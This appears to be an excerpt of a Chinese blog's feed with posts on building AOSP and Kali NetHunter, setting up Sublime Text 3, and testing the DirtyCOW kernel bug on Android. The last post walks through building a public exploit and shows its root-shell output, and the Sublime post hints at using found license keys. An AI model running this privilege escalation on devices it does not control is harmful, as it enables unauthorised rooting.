+    <updated>2016-11-21T06:06:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>AOSP，就是”Android Open-Source Project”的缩写，中文意为”Android 开放源代码项目”。AOSP是android系统中最纯净的版本，既不包含GAPPS也没有各手机厂商的个性化代码，但是它是所有分支的基础。</p>
+<p>编译AOSP主要有四个步骤：1.构建编译环境，2.下载AOSP源码，3.编译源码，4.运行</p>
+<p>推荐在实体机使用Ubuntu14.04 LTS作为工作系统(虚拟机性能低下，编译时间会过长)，如果使用Ubuntu 16.04 LTS需要对编译脚本做一处修改，下文会提到。</p>
+<a id="more"></a>
+<h1 id="构建编译环境"><a href="#构建编译环境" class="headerlink" title="构建编译环境"></a>构建编译环境</h1><p>系统可能自带jdk，但是为了防止版本不对导致编译出错，需要卸载掉现有版本然后再安装正确版本的jdk。<br>首先用<code>ctrl + alt + t</code>快捷键打开终端，输入以下命令</p>
+<blockquote>
+<p>sudo apt-get purge openjdk-* icedtea-* icedtea6-*</p>
+</blockquote>
+<p>然后安装正确版本的jdk，Marshmallow需要使用jdk7，运行以下命令。</p>
+<blockquote>
+<p>sudo apt-get update<br>sudo apt-get install openjdk-7-jdk</p>
+</blockquote>
+<p>安装完成后输入下面命令查看java版本是否正确。</p>
+<blockquote>
+<p>java -version</p>
+</blockquote>
+<p>如果显示<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">java</span> <span class="selector-tag">version</span> "1<span class="selector-class">.7</span><span class="selector-class">.0_65</span>"</div><div class="line"><span class="selector-tag">OpenJDK</span> <span class="selector-tag">Runtime</span> <span class="selector-tag">Environment</span> (<span class="selector-tag">IcedTea</span> 2<span class="selector-class">.5</span><span class="selector-class">.3</span>)</div><div class="line"><span class="selector-tag">OpenJDK</span> 64<span class="selector-tag">-Bit</span> <span class="selector-tag">Server</span> <span class="selector-tag">VM</span> (<span class="selector-tag">build</span> 24<span class="selector-class">.65-b04</span>, <span class="selector-tag">mixed</span> <span class="selector-tag">mode</span>)</div></pre></td></tr></table></figure></p>
+<p>说明版本正确。</p>
+<p>接下来安装一些编译是依赖的工具<br>Ubuntu 14.04下运行：</p>
+<blockquote>
+<p>sudo apt-get install bison g++-multilib git gperf libxml2-utils make zlib1g-dev:i386 zip</p>
+</blockquote>
+<p>Ubuntu 16.04下务必运行：</p>
+<blockquote>
+<p>sudo apt-get install libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib<br>sudo apt-get install tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386<br>sudo apt-get install dpkg-dev libsdl1.2-dev libesd0-dev<br>sudo apt-get install git-core gnupg flex bison gperf build-essential<br>sudo apt-get install zip curl zlib1g-dev gcc-multilib g++-multilib<br>sudo apt-get install libc6-dev-i386<br>sudo apt-get install lib32ncurses5-dev x11proto-core-dev libx11-dev<br>sudo apt-get install lib32z-dev ccache<br>sudo apt-get install libgl1-mesa-dev libxml2-utils xsltproc unzip m4</p>
+</blockquote>
+<p>下载android源码需要工具repo</p>
+<blockquote>
+<p>mkdir ~/bin<br>curl <a href="http://commondatastorage.googleapis.com/git-repo-downloads/repo" target="_blank" rel="external">http://commondatastorage.googleapis.com/git-repo-downloads/repo</a> &gt; ~/bin/repo<br>chmod a+x ~/bin/repo</p>
+</blockquote>
+<p>接下来需要把repo所在的文件夹添加到环境变量</p>
+<blockquote>
+<p>nano ~/.bashrc</p>
+</blockquote>
+<p>在文件末尾追加一行</p>
+<blockquote>
+<p>export PATH=~/bin:$PATH</p>
+</blockquote>
+<p>为了让添加的立即生效</p>
+<blockquote>
+<p>source ~/.bashrc</p>
+</blockquote>
+<p>现在所有需要用到的工具就安装完成了</p>
+<h1 id="下载AOSP源码"><a href="#下载AOSP源码" class="headerlink" title="下载AOSP源码"></a>下载AOSP源码</h1><p>在终端下运行：</p>
+<blockquote>
+<p>mkdir ~/android-6.0.1<br>cd ~/android-6.0.1</p>
+</blockquote>
+<p><strong>注意</strong> 如果是第一次使用git，先运行：</p>
+<blockquote>
+<p> git config –global user.name “Your Name”<br>git config –global user.email “you@example.com”</p>
+</blockquote>
+<p>然后运行：</p>
+<blockquote>
+<p>repo init -u <a href="https://android.googlesource.com/platform/manifest" target="_blank" rel="external">https://android.googlesource.com/platform/manifest</a> -b android-6.0.1_r70</p>
+</blockquote>
+<p><strong>注意</strong> 请确保硬盘有至少60G的空间，因为AOSP源码体积相当庞大，而且编译过程中还会生成很多文件。</p>
+<p>现在运行<code>repo sync</code>就会开始下载源代码，下载时长取决于网络速度，慢慢等着就好。</p>
+<h1 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h1><p><strong>Ubuntu 16.04注意</strong><br>找到<code>art/build/Android.common_build.mk</code>，定位到第75行，把代码改成下面的样子：</p>
+<blockquote>
+<p>ifeq ($(WITHOUT_HOST_CLANG),false)</p>
+</blockquote>
+<p>在源码下载完毕后运行下面命令：</p>
+<blockquote>
+<p>source build/envsetup.sh &amp;&amp; lunch</p>
+</blockquote>
+<p>现在会列出所有可以编译的设备的列表，<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">    <span class="attribute">You</span>'re building <span class="literal">on</span> Linux</div><div class="line"></div><div class="line"><span class="attribute">Lunch</span> menu... pick a combo:</div><div class="line">     <span class="attribute">1</span>. aosp_arm-eng</div><div class="line">     <span class="attribute">2</span>. aosp_arm64-eng</div><div class="line">     <span class="attribute">3</span>. aosp_mips-eng</div><div class="line">     <span class="attribute">4</span>. aosp_mips64-eng</div><div class="line">     <span class="attribute">5</span>. aosp_x86-eng</div><div class="line">     <span class="attribute">6</span>. aosp_x86_64-eng</div><div class="line">     <span class="attribute">7</span>. aosp_deb-userdebug</div><div class="line">     <span class="attribute">8</span>. aosp_flo-userdebug</div><div class="line">     <span class="attribute">9</span>. full_fugu-userdebug</div><div class="line">     <span class="attribute">10</span>. aosp_fugu-userdebug</div><div class="line">     <span class="attribute">11</span>. mini_emulator_arm64-userdebug</div><div class="line">     <span class="attribute">12</span>. m_e_arm-userdebug</div><div class="line">     <span class="attribute">13</span>. mini_emulator_mips-userdebug</div><div class="line">     <span class="attribute">14</span>. mini_emulator_x86_64-userdebug</div><div class="line">     <span class="attribute">15</span>. mini_emulator_x86-userdebug</div><div class="line">     <span class="attribute">16</span>. aosp_flounder-userdebug</div><div class="line">     <span class="attribute">17</span>. aosp_angler-userdebug</div><div class="line">     <span class="attribute">18</span>. aosp_bullhead-userdebug</div><div class="line">     <span class="attribute">19</span>. aosp_hammerhead-userdebug</div><div class="line">     <span class="attribute">20</span>. aosp_hammerhead_fp-userdebug</div><div class="line">     <span class="attribute">21</span>. aosp_shamu-userdebug</div><div class="line"></div><div class="line"><span class="attribute">Which</span> would you like?<span class="meta"> [aosp_arm-eng]</span></div></pre></td></tr></table></figure></p>
+<p>输入目标硬件的编号回车，运行下面命令开始编译：</p>
+<blockquote>
+<p>make -jn</p>
+</blockquote>
+<p><strong>注意</strong> 此处n是机器的cpu的线程数，举个例子：如果你的机器的cpu是i7-6700k，6700k是四核八线程，所以这里n是8的时候理论上是编译速度最快的</p>
+<p>接下来就是等待。。。当显示</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#### make completed successfully (<span class="number">49</span>:<span class="number">58</span> (mm:ss)) ####</div></pre></td></tr></table></figure>
+<p>说明编译成功</p>
+<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>不要关闭终端，启动模拟器：</p>
+<blockquote>
+<p>emulator</p>
+</blockquote>
+<p>等一会就会出现模拟器的画面</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>AOSP编译额外命令，以下所有命令都是在运行了<code>source build/envsetup.sh</code>后可用。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">命令</th>
+<th style="text-align:left">解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">croot</td>
+<td style="text-align:left">回到aosp源码树根目录</td>
+</tr>
+<tr>
+<td style="text-align:left">godir [filename]</td>
+<td style="text-align:left">跳转到包含某个文件的目录</td>
+</tr>
+<tr>
+<td style="text-align:left">m</td>
+<td style="text-align:left">在源码树的根目录执行编译</td>
+</tr>
+<tr>
+<td style="text-align:left">mm</td>
+<td style="text-align:left">编译当前路径下所有模块，但不包含依赖</td>
+</tr>
+<tr>
+<td style="text-align:left">mma</td>
+<td style="text-align:left">编译当前路径下所有模块，且包含依赖</td>
+</tr>
+<tr>
+<td style="text-align:left">mmm [module_path]</td>
+<td style="text-align:left">编译指定路径下所有模块，但不包含依赖</td>
+</tr>
+<tr>
+<td style="text-align:left">mmma [module_path]</td>
+<td style="text-align:left">编译指定路径下所有模块，且包含依赖</td>
+</tr>
+<tr>
+<td style="text-align:left">make snod</td>
+<td style="text-align:left">重新打包生成system.img</td>
+</tr>
+<tr>
+<td style="text-align:left">make otapackage</td>
+<td style="text-align:left">编译生成.zip格式的刷机包</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;AOSP，就是”Android Open-Source Project”的缩写，中文意为”Android 开放源代码项目”。AOSP是android系统中最纯净的版本，既不包含GAPPS也没有各手机厂商的个性化代码，但是它是所有分支的基础。&lt;/p&gt;
+&lt;p&gt;编译AOSP主要有四个步骤：1.构建编译环境，2.下载AOSP源码，3.编译源码，4.运行&lt;/p&gt;
+&lt;p&gt;推荐在实体机使用Ubuntu14.04 LTS作为工作系统(虚拟机性能低下，编译时间会过长)，如果使用Ubuntu 16.04 LTS需要对编译脚本做一处修改，下文会提到。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="android" scheme="https://t1h0can.github.io/tags/android/"/>
+    
+      <category term="系统" scheme="https://t1h0can.github.io/tags/%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>构建Kali-NetHunter教程</title>
+    <link href="https://t1h0can.github.io/2016/11/11/%E7%BC%96%E8%AF%91Kali-NetHunter/"/>
+    <id>https://t1h0can.github.io/2016/11/11/编译Kali-NetHunter/</id>
+    <published>2016-11-11T05:08:39.000Z</published>
+    <updated>2016-11-15T18:39:25.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>kali linux是大名鼎鼎的渗透测试系统，基于debian发行，但是采用滚动更新，系统集成了众多渗透测试工具，他的前身是同样有名的backtrack。<br>2014年官方发布了适用于android平台的NetHunter工具包，因为nethunter需要修改内核，最初只支持nexus系列，经过各路大神的努力，现在已经适配六十种机型或系统<br><a id="more"></a><br>    <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">htc_pmewl manta flounder flocm</div><div class="line">flo grouper angler <span class="keyword">shamu </span><span class="keyword">shamucm </span><span class="keyword">bullhead</span></div><div class="line">hammerheadmon hammerheadcm hammerhead makocm mako</div><div class="line"><span class="keyword">shieldtablet </span>oneplusxcm oneplus2cm oneplus2oos</div><div class="line">oneplus3 oneplus1 h830 h850 hlteeur hltecan hltespr</div><div class="line">hltekor hlteeur-touchwiz hltecan-touchwiz hltespr-</div><div class="line">touchwiz hltekor-touchwiz hltedcm-touchwiz hltekdi-</div><div class="line">touchwiz <span class="keyword">jfltexx </span>klte kltekdi kltespr kltevzw kltechn</div><div class="line">klte-touchwiz klteduos-touchwiz kltespr-touchwiz</div><div class="line">klteusc-touchwiz kltevzw-touchwiz klteskt-touchwiz</div><div class="line">kltekdi-touchwiz herolte heroltekor hero2lte</div><div class="line">hero2ltekor gracelte graceltekor kipper cancrocm</div><div class="line">a5ulte a5ulte-touchwiz dogo yuga kiwi</div></pre></td></tr></table></figure></p>
+<p>因为我手上有米3,正好还用着cm13系统，以下教程全部以米3(cancro)为例</p>
+<h1 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h1><blockquote>
+<p>git clone <a href="https://github.com/offensive-security/kali-nethunter" target="_blank" rel="external">https://github.com/offensive-security/kali-nethunter</a></p>
+</blockquote>
+<h1 id="构建准备"><a href="#构建准备" class="headerlink" title="构建准备"></a>构建准备</h1><blockquote>
+<p>ls kali-nethunter</p>
+</blockquote>
+<p><img src="/assets/blogimg/ls_nethunter.png" alt="ls_nethunter"></p>
+<blockquote>
+<p>cd kali-nethunter/nethunter-installer<br>./bootstrap.sh</p>
+</blockquote>
+<p>接下来会出现两个问题，都输入<code>y</code><br>    <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Would you like <span class="built_in">to</span> use <span class="keyword">the</span> experimental devices branch? (y/N): y</div><div class="line">Would you like <span class="built_in">to</span> grab <span class="keyword">the</span> full history <span class="keyword">of</span> devices? (y/N): y</div></pre></td></tr></table></figure></p>
+<p>等下载完成后准备工作就完成了</p>
+<h1 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h1><p>运行<code>python build.py</code>构建刷机包前有些需要注意的地方:<br>1.此处<code>python</code>需要用python2,默认使用python3的系统在运行时把改成<code>python2 build.py</code><br>2.<code>build.py</code>中有以下参数<br>    <figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">-help 或 -h : 显示帮助信息并退出</span></div><div class="line">-<span class="ruby">-device 或 -d : 构建时后跟目标设备</span></div><div class="line">-<span class="ruby">-kitkat 或 -kk : android4.<span class="number">4.4</span></span></div><div class="line">-<span class="ruby">-lollipop 或 -l : Android <span class="number">5</span></span></div><div class="line">-<span class="ruby">-marshmallow 或 -m : Android <span class="number">6</span></span></div><div class="line">-<span class="ruby">-nougat 或 -n : Android <span class="number">7</span></span></div><div class="line">-<span class="ruby">-forcedown 或 -f : 强制重新下载</span></div><div class="line">-<span class="ruby">-uninstaller或 -u : 构建一个卸载工具</span></div><div class="line">-<span class="ruby">-kernel 或 -k : 只构建内核</span></div><div class="line">-<span class="ruby">-nokernel 或 -nk : 构建的刷机包里不包含内核</span></div><div class="line">-<span class="ruby">-nosu 或 -ns : 构建的刷机包不包含SuperSU</span></div><div class="line">-<span class="ruby">-nobrand 或 -nb : 构建的刷机包不包含nethunter的壁纸和启动动画</span></div><div class="line">-<span class="ruby">-nofreespace 或 --nb : 构建的刷机包不检测可用空间</span></div><div class="line">-<span class="ruby">-generic ARCH 或 -g ARCH : 构建更新包（只修改ramdisk）</span></div><div class="line">-<span class="ruby">-rootfs SIZE 或 -fs SIZE : 构建时选择完整程度（full 或者 minimal）</span></div><div class="line">-<span class="ruby">-release VERSION, -r VERSION : 指定刷机包发行版本</span></div></pre></td></tr></table></figure></p>
+<p>对于基于cm13的米3,命令如下</p>
+<blockquote>
+<p>python build.py -d cancrocm -m -fs full </p>
+</blockquote>
+<p>运行完成后文件夹下会出现<code>nethunter-cancrocm-marshmallow-kalifs-full-20161111_141351.zip</code></p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>把<code>nethunter-cancrocm-marshmallow-kalifs-full-20161111_141351.zip</code>放到手机sdcard下，用TWRP刷入</p>
+<h1 id="安装后可能出现的问题"><a href="#安装后可能出现的问题" class="headerlink" title="安装后可能出现的问题"></a>安装后可能出现的问题</h1><p>第一次开机会很慢<br>通知栏下拉会不显示快捷开关<br>各种工具可能需要从刷机包里解压手动安装<br>手机会明显卡顿</p>
+<p><strong>此教程仅供参考，如果您的设备在刷入安装包后出现包括但不仅限于以上的问题，本人概不负责，Kali官方团队也不会为此负责</strong></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;kali linux是大名鼎鼎的渗透测试系统，基于debian发行，但是采用滚动更新，系统集成了众多渗透测试工具，他的前身是同样有名的backtrack。&lt;br&gt;2014年官方发布了适用于android平台的NetHunter工具包，因为nethunter需要修改内核，最初只支持nexus系列，经过各路大神的努力，现在已经适配六十种机型或系统&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="android" scheme="https://t1h0can.github.io/tags/android/"/>
+    
+      <category term="安全" scheme="https://t1h0can.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="Kali" scheme="https://t1h0can.github.io/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Sublime Text 3安装配置</title>
+    <link href="https://t1h0can.github.io/2016/11/10/sublime-text-3%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
+    <id>https://t1h0can.github.io/2016/11/10/sublime-text-3安装配置/</id>
+    <published>2016-11-10T17:00:11.000Z</published>
+    <updated>2016-12-18T02:24:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h1><p>sublime text 3是具有代码高亮、语法提示、自动完成且反应快速的编辑器软件，界面华丽，支持插件拓展(整个软件里我只觉得logo有点碍眼，引用我一个朋友的话：感觉是从一个十年前的软件上拿来的，文末提供kde主题里的logo可以替换)。<br>sublime text 3一直处于测试版状态，最新版本是build 3162，虽说还是测试版，稳定性没得说。<br>相对于vim的难上手，VS等大型IDE的臃肿，sublime text 3无疑是最佳选择。</p>
+<a id="more"></a>
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a><strong>下载</strong></h1><p><a href="https://www.sublimetext.com/3" target="_blank" rel="external">下载地址</a><br><img src="/assets/blogimg/sublime_web.png" title="sublime_web"><br>如图，sublime官方提供</p>
+<pre><code>- windows(32/64位)的exe和免安装版(portable)
+- mac os(10.7以后可用)的dmg包
+- ubuntu(32/64位)版的deb包
+- tar.bz2压缩包给其他linux发行版
+</code></pre><p>不同系统可以各取所需</p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h1><p>以下安装方法主要针对非debian系的linux发行版(redhat系,arch系,etc)，当然debian系也是适用的。<br>以X64为例，打开终端</p>
+<blockquote>
+<p>wget <a href="https://download.sublimetext.com/sublime_text_3_build_3126_x64.tar.bz2" target="_blank" rel="external">https://download.sublimetext.com/sublime_text_3_build_3126_x64.tar.bz2</a><br>tar -jxvf sublime_text_3_build_3126_x64.tar.bz2<br>ls sublime_text_3</p>
+</blockquote>
+<p>能看到下图<br><img src="/assets/blogimg/ls_sublime.png" title="ls_sublime"><br>把快捷方式复制到<code>/usr/share/applications</code>下</p>
+<blockquote>
+<p>sudo cp sublime_text_3/sublime_text.desktop /usr/share/applications</p>
+</blockquote>
+<p>把整个文件夹移动到<code>/opt</code>下</p>
+<blockquote>
+<p>sudo mv -r sublime_text_3 /opt/sublime_text</p>
+</blockquote>
+<p>至此安装完毕<br>ps:以后软件有更新的话，下载最新版</p>
+<blockquote>
+<p>sudo rm -rf /opt/sublime_text_3</p>
+</blockquote>
+<p>用上文的<code>tar -jxvf</code>命令解压，<code>sudo mv</code>移动</p>
+<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a><strong>注册</strong></h1><p>因为闭源收费，会要求注册，虽然可以无限期免费使用，但是会隔三差五弹出提示窗口，比较烦人，编辑窗口上还有一个降低逼格的<code>UNREGISTERED</code>标志。有钱的可以上官网买个注册码支持一下作者软件开发，当然注册码这种东西一搜一堆，复制后在<code>help-&gt;Enter license</code>粘贴就好。</p>
+<h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a><strong>安装插件</strong></h1><p>Sublime Text 最大的特色就是支持大量插件，利用Package Control我们可以很方便地查找、安装和卸载 Sublime Text 中的插件。</p>
+<h2 id="安装Package-Control"><a href="#安装Package-Control" class="headerlink" title="安装Package Control"></a>安装Package Control</h2><p>用<code>ctrl+` </code>打开sublime的控制台(<code>` </code>是键盘上ESC下面的那个键)粘贴下面的代码：<br>    <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import urllib.request,os,hashlib; h = <span class="string">'df21e130d211cfc94d9b0905775a7c0f'</span> + <span class="string">'1e3d39e33b79698005270310898eea76'</span>; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); <span class="keyword">by</span> = urllib.request.urlopen( <span class="string">'http://packagecontrol.io/'</span> + pf.<span class="built_in">replace</span>(<span class="string">' '</span>, <span class="string">'%20'</span>)).<span class="built_in">read</span>(); dh = hashlib.sha256(<span class="keyword">by</span>).hexdigest(); print(<span class="string">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> <span class="built_in">open</span>(os.path.join( ipp, pf), <span class="string">'wb'</span> ).<span class="built_in">write</span>(<span class="keyword">by</span>)</div></pre></td></tr></table></figure></p>
+<p>重启Sublime Text 3。如果看到<code>Perferences-&gt;package control</code>这一项，则安装成功。<br>打开<code>package control-&gt;install package</code>就可以搜索安装插件了</p>
+<p>##插件推荐<br><strong>ConvertToUTF8</strong> 支持 GBK, BIG5, EUC-KR, EUC-JP, Shift_JIS 等编码的插件<br><strong>Bracket Highlighter</strong> 用于匹配括号，引号和html标签。对于很长的代码很有用。安装好之后，不需要设置插件会自动生效<br><strong>WakaTime</strong> 可以精确地统计你花在某个项目上多长时间，用的什么语言，关键是适合发票圈装X。<br><strong>YouCompleteMe</strong> 代码补全方面的神器<br><strong>ChineseLocalizations</strong> 汉化补丁<br><strong>SideBarEnhancements</strong> 功能强大的侧边栏<br><strong>terminal</strong> 右键直接打开终端<br><strong>SublimeAStyleFormatter</strong> 格式化c/c++代码，专治各种缩进不齐，强迫症必备<br><strong>colorsublime</strong> 快速安装各种配色风格</p>
+<h1 id="软件图标替换"><a href="#软件图标替换" class="headerlink" title="软件图标替换"></a>软件图标替换</h1><p>还是这张图<br><img src="/assets/blogimg/ls_sublime.png" title="ls_sublime"><br>软件的“low狗”就在Icon文件夹下，喜欢扁平化的人可以用<a href="https://raw.githubusercontent.com/T1h0can/blog_file/master/Icon.tar.gz" target="_blank" rel="external">这里</a>的替换掉。</p>
+<table>
+<thead>
+<tr>
+<th>原版</th>
+<th>kde                               </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img src="/assets/blogimg/sublime-text_def.png" alt="sublime_def"></td>
+<td><img src="/assets/blogimg/sublime-text_new.png" alt="sublime_new">        </td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;简介&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;sublime text 3是具有代码高亮、语法提示、自动完成且反应快速的编辑器软件，界面华丽，支持插件拓展(整个软件里我只觉得logo有点碍眼，引用我一个朋友的话：感觉是从一个十年前的软件上拿来的，文末提供kde主题里的logo可以替换)。&lt;br&gt;sublime text 3一直处于测试版状态，最新版本是build 3162，虽说还是测试版，稳定性没得说。&lt;br&gt;相对于vim的难上手，VS等大型IDE的臃肿，sublime text 3无疑是最佳选择。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="sublime" scheme="https://t1h0can.github.io/tags/sublime/"/>
+    
+      <category term="工具" scheme="https://t1h0can.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+      <category term="编辑器" scheme="https://t1h0can.github.io/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DirtyCOW(CVE-2016-5195)测试</title>
+    <link href="https://t1h0can.github.io/2016/11/10/DirtyCOW-CVE-2016-5195-%E6%B5%8B%E8%AF%95/"/>
+    <id>https://t1h0can.github.io/2016/11/10/DirtyCOW-CVE-2016-5195-测试/</id>
+    <published>2016-11-09T22:17:22.000Z</published>
+    <updated>2016-11-17T17:43:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近研究人员Phil Oester发现了dirtyCOW脏奶牛漏洞，影响从2007年linux2.6.22至今的所有linux内核。dirtyCOW是本地提权漏洞，具体是利用linux内存子系统在处理写时复制(copy-on-write,COW)时产生了竞争条件,使得低权限用户有机会对只读内存里的内容进行写入操作，达到提权的目的。<br>众所周知，android系统也是基于linux内核，所以dirtyCOW对android设备同样适用，而且是全系android通用，因为android 1.0 内核版本是2.6.25。<br>github上已经有人放出了android可用的<a href="https://github.com/timwr/CVE-2016-5195" target="_blank" rel="external">PoC</a>,而谷歌11月5日发布的安全更新还没有修复这个漏洞，有兴趣测试的可以一下。</p>
+<a id="more"></a>
+<h1 id="零-编译环境"><a href="#零-编译环境" class="headerlink" title="零.编译环境"></a>零.编译环境</h1><p>工欲善其事，必先利其器,想让用c语言编写的dirtyCOW在android平台运行，android-ndk必不可少。<br>android-ndk可以通过android-studio下载，然后把ndk所在文件夹添加到环境变量<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nano .bashrc</div><div class="line"><span class="built_in">export</span> NDK_HOME=/home/username/Android/Sdk/ndk-bundle</div><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$NDK_HOME</span></div></pre></td></tr></table></figure></p>
+<p>username改成自己的用户名<br>为了让添加的立即生效</p>
+<blockquote>
+<p>source .bashrc</p>
+</blockquote>
+<h1 id="一-代码下载"><a href="#一-代码下载" class="headerlink" title="一.代码下载"></a>一.代码下载</h1><blockquote>
+<p>git clone <a href="https://github.com/timwr/CVE-2016-5195.git" target="_blank" rel="external">https://github.com/timwr/CVE-2016-5195.git</a></p>
+</blockquote>
+<h1 id="二-编译"><a href="#二-编译" class="headerlink" title="二.编译"></a>二.编译</h1><blockquote>
+<p>cd CVE-2016-5195</p>
+</blockquote>
+<p>此时把设备用usb连接电脑，并打开usb调试，确保已经安装adb，如果没有，ubuntu下运行</p>
+<blockquote>
+<p>sudo apt-get install android-tools-adb</p>
+</blockquote>
+<p>编译</p>
+<blockquote>
+<p>make root</p>
+</blockquote>
+<p>接下来稍等片刻，编译脚本会自动把编译好的文件通过adb发送到设备<br>最后会看到终端下提示<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">adb push libs/armeabi/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">[100%] /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">adb <span class="keyword">shell</span> 'chmod 777 /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">adb <span class="keyword">shell</span> '/data/<span class="keyword">local</span>/tmp/dirtycow /system/bin/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">warning: new <span class="keyword">file</span> size (9464) and <span class="keyword">file</span> old size (17944) differ</div><div class="line"></div><div class="line">size 17944</div><div class="line"></div><div class="line"></div><div class="line">[*] mmap 0xb51e5000</div><div class="line">[*] exploit (patch)</div><div class="line">[*] currently 0xb51e5000=464c457f</div><div class="line">[*] madvise = 0xb51e5000 17944</div><div class="line">[*] madvise = 0 1048576</div><div class="line">[*] /proc/self/mem 1635778560 1048576</div><div class="line">[*] exploited 0xb51e5000=464c457f</div><div class="line">adb <span class="keyword">shell</span> /system/bin/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">running <span class="keyword">as</span> uid 2000</div><div class="line">uid 0</div></pre></td></tr></table></figure></p>
+<p>运行<code>run-as</code>时的uid为0,已经达到提权的目的，测试完毕。</p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>dirtyCOW确实可以达到提权的目的，但是通过这个漏洞只能覆盖掉系统里已有的文件，并不能直接添加文件，也就是说单纯通过这一个漏洞达到root手机的目的有些困难。xda论坛已经有人通过这个漏洞在已经解锁的设备上刷入了第三方recovery，但是这种方法风险太大，有可能变砖，好在11月安全更新并没有修复dirtyCOW，至少还有一个月时间让各路大神探索其他风险更小的root途径。</p>
+]]></content>
+    
+    <summary type="html">
+    
